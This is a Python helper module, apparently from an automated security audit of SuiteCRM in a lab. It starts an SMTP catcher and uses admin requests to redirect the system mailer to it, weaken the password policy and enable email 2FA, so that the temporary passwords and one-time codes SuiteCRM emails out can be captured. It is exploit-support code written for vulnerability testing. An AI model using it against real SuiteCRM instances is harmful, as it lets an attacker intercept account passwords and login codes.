"""
Shared SMTP-catcher + outbound-mail-config helper for SuiteCRM stage-10
Cluster W2-D (crypto / weak-token / auth-logic) exploits.

This is an ADDITIVE helper alongside the manifest's _common.py (not a
modification of it, to avoid clobbering other concurrently-running stage-10
subagents that also import _common.py). Findings that need a live outbound
mail transport (VULN-038 system-generated password, VULN-040/VULN-091 2FA
email OTP) import this in addition to _common.

Why this exists:
  - SuiteCRM's GeneratePassword.php / SugarAuthenticateUser::sendFactorTokenToUser()
    only apply their (weak, mt_rand-derived) secret to the account/session
    when SugarPHPMailer->Send() succeeds. The lab ships no MTA, so by default
    those flows fail closed (no side effect). We stand up a tiny SMTP stub
    that speaks just enough SMTP for PHPMailer to consider the send a
    success, and capture the message body PHPMailer sends us -- this is the
    same OOB-listener technique already validated for VULN-045 in this audit
    (see claude_audit/SuiteCRM/exploits/VULN-045), pointed at the *system*
    outbound-mail config (modules/Administration/PasswordManager.php ->
    Administration::saveConfig() -> OutboundEmail::saveSystem()) instead of
    the one-shot "Test Settings" AJAX action.
  - modules/Users/User.php:save() additionally *hard-blocks* any factor_auth
    change (even by admin) while Administration::checkSmtpError() is true,
    i.e. while the system outbound mailer is unconfigured
    (modules/Administration/Administration.php:97-101). So configuring a
    working system mailer is a *shared prerequisite* for VULN-040/VULN-091
    too, not just VULN-038.

Verified manually against this lab before being wrapped here:
  - POST module=Administration&action=PasswordManager (saveConfig=1) with
    mail_smtpserver/mail_smtpport/mail_sendtype persists directly to the
    `outbound_email` system row (Administration::saveConfig() special-cases
    any POST key containing "mail_") -- confirmed via
    `docker compose exec db mysql ... 'SELECT ... FROM outbound_email'`.
  - passwordsetting_SystemGeneratedPasswordON / passwordsetting_forgotpasswordON
    persist to config_override.php via Configurator::populateFromPost() --
    confirmed via `docker compose exec app cat config_override.php`.
  - generatepasswordtmpl / lostpasswordtmpl / factoremailtmpl are *already*
    wired to real EmailTemplates rows in the lab's shipped config.php, so we
    do not need to set them.
"""
import os
import socket
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import BASE_URL, log  # noqa: E402

# Seed EmailTemplates rows already wired in this lab's config.php (verified
# via `docker compose exec app cat config.php`) -- kept here for reference /
# so a finding can assert on the id if it wants to.
TMPL_GENERATE_PASSWORD = "b3c357fb-ad20-4c90-85e6-374413df4e5e"   # "System-generated password email"
TMPL_LOST_PASSWORD = "647cf968-bb37-4ed6-95df-21ff28a9246f"      # "Forgot Password email"
TMPL_FACTOR_AUTH = "f14b6cb0-8104-4506-8ed3-c4b7d7294f76"        # "Two Factor Authentication email"

# Per TARGET_FACTS.md: the app container reaches the host at 172.18.0.1;
# 33116 is the app itself, 33119-33121 are the free OOB-listener ports.
OOB_HOST = os.environ.get("OOB_HOST", "172.18.0.1")
OOB_SMTP_PORT = int(os.environ.get("OOB_SMTP_PORT", "33121"))


class SmtpCatcher:
    """A minimal SMTP server: just enough protocol for PHPMailer's SMTP
    client (SuiteCRM's SugarPHPMailer / PHPMailer) to consider a send
    successful, capturing each message's MAIL FROM / RCPT TO / DATA body.

    Not a real MTA -- does not relay, queue, or validate; purely a catcher so
    we can (a) let SuiteCRM's own "did the email send" gate pass and (b) read
    back whatever secret it put in the body (temp password / OTP code).
    """

    def __init__(self, host="0.0.0.0", port=OOB_SMTP_PORT):
        self.host = host
        self.port = port
        self.messages = []  # list of dicts: {mail_from, rcpt_to, data}
        self._lock = threading.Lock()
        self._sock = None
        self._thread = None
        self._stop = False

    def start(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self.host, self.port))
        self._sock.listen(8)
        self._sock.settimeout(0.5)
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()
        log("SETUP", f"SMTP catcher listening on {self.host}:{self.port} "
                      f"(app reaches it at {OOB_HOST}:{self.port})")
        return self

    def stop(self):
        self._stop = True
        if self._thread:
            self._thread.join(timeout=3)
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    def _serve(self):
        while not self._stop:
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                self._handle(conn, addr)
            except Exception as exc:  # noqa: BLE001
                log("INFO", f"SMTP catcher connection error from {addr}: {exc}")
            finally:
                try:
                    conn.close()
                except OSError:
                    pass

    def _handle(self, conn, addr):
        conn.settimeout(10)
        f = conn.makefile("rwb", buffering=0)

        def send(line):
            f.write((line + "\r\n").encode())

        def readline():
            return f.readline().decode(errors="replace").rstrip("\r\n")

        send("220 cvehunter-catcher ESMTP ready")
        mail_from = None
        rcpt_to = []
        while True:
            line = readline()
            if line == "":
                break
            upper = line.upper()
            if upper.startswith("EHLO") or upper.startswith("HELO"):
                send("250 cvehunter-catcher Hello")
            elif upper.startswith("MAIL FROM"):
                mail_from = line
                send("250 2.1.0 OK")
            elif upper.startswith("RCPT TO"):
                rcpt_to.append(line)
                send("250 2.1.5 OK")
            elif upper.startswith("DATA"):
                send("354 Start mail input; end with <CRLF>.<CRLF>")
                data_lines = []
                while True:
                    dl = f.readline().decode(errors="replace")
                    if dl in (".\r\n", ".\n", ""):
                        break
                    data_lines.append(dl)
                body = "".join(data_lines)
                with self._lock:
                    self.messages.append({
                        "from_addr": addr[0],
                        "mail_from": mail_from,
                        "rcpt_to": list(rcpt_to),
                        "data": body,
                    })
                send("250 2.0.0 OK: message accepted")
            elif upper.startswith("RSET"):
                mail_from, rcpt_to = None, []
                send("250 2.0.0 OK")
            elif upper.startswith("NOOP"):
                send("250 2.0.0 OK")
            elif upper.startswith("QUIT"):
                send("221 2.0.0 Bye")
                break
            else:
                send("250 2.0.0 OK")

    def wait_for_message(self, timeout=15, since=0):
        """Block until at least `since`+1 messages have been captured, or
        timeout. Returns the newest message dict or None."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            with self._lock:
                if len(self.messages) > since:
                    return self.messages[-1]
            time.sleep(0.2)
        return None


def configure_system_outbound_smtp(admin_s, host=OOB_HOST, port=OOB_SMTP_PORT,
                                    system_generated_password_on=True,
                                    forgot_password_on=True, base=BASE_URL):
    """As admin: point the SYSTEM outbound mailer at our SMTP catcher and
    (optionally) flip the SystemGeneratedPasswordON / forgotpasswordON
    password-manager toggles.

    Real admin action: POST to modules/Administration/PasswordManager.php
    (module=Administration&action=PasswordManager, saveConfig=1). Persists to
    the `outbound_email` system row (mail_smtp*) and config_override.php
    (passwordsetting_*) -- verified live (see module docstring).
    """
    data = {
        "saveConfig": "1",
        "mail_sendtype": "SMTP",
        "mail_smtptype": "other",
        "mail_smtpserver": host,
        "mail_smtpport": str(port),
        "mail_smtpssl": "0",
        "mail_smtpauth_req": "0",
        "mail_smtpuser": "",
        "mail_smtppass": "",
        "passwordsetting_oneupper": "0",
        "passwordsetting_onelower": "0",
        "passwordsetting_onenumber": "0",
        "passwordsetting_onespecial": "0",
        "passwordsetting_minpwdlength": "6",
    }
    if system_generated_password_on:
        data["passwordsetting_SystemGeneratedPasswordON"] = "1"
    if forgot_password_on:
        data["passwordsetting_forgotpasswordON"] = "1"

    r = admin_s.post(
        f"{base}/index.php?module=Administration&action=PasswordManager",
        data=data,
        headers={"Referer": f"{base}/index.php?module=Administration&action=PasswordManager"},
        allow_redirects=False,
        timeout=60,
    )
    ok = r.status_code in (200, 301, 302)
    log("SETUP" if ok else "FAIL",
        f"PasswordManager saveConfig -> status={r.status_code} "
        f"loc={r.headers.get('Location','')!r} (mail_smtpserver={host}:{port}, "
        f"SystemGeneratedPasswordON={system_generated_password_on}, "
        f"forgotpasswordON={forgot_password_on})")
    return r


def enable_2fa_for_user(admin_s, user, base=BASE_URL):
    """As admin: set factor_auth=1 on an existing user (EditView Save).

    Requires a working system outbound mailer first -- modules/Users/User.php
    save() hard-resets factor_auth back to its previous value whenever
    Administration::checkSmtpError() is true (modules/Administration/
    Administration.php:97-101), *regardless* of admin status. Call
    configure_system_outbound_smtp() before this.

    `user` is the dict returned by _common.create_user() ({user_name, id,
    password}). Verifies via the same EditView Save primitive create_user()
    itself uses, so no new admin surface is introduced.
    """
    r = admin_s.post(
        f"{base}/index.php",
        data={
            "module": "Users", "action": "Save", "record": user["id"], "page": "EditView",
            "user_name": user["user_name"], "last_name": "Stage10-2FA", "first_name": "Low",
            "status": "Active", "is_admin": "0", "employee_status": "Active",
            "UserType": "RegularUser",
            "factor_auth": "1",
        },
        headers={"Referer": f"{base}/index.php?module=Users&action=EditView&record={user['id']}"},
        allow_redirects=False,
        timeout=60,
    )
    ok = r.status_code in (200, 301, 302)
    log("SETUP" if ok else "FAIL",
        f"Users Save factor_auth=1 for {user['user_name']} -> status={r.status_code}")
    return r
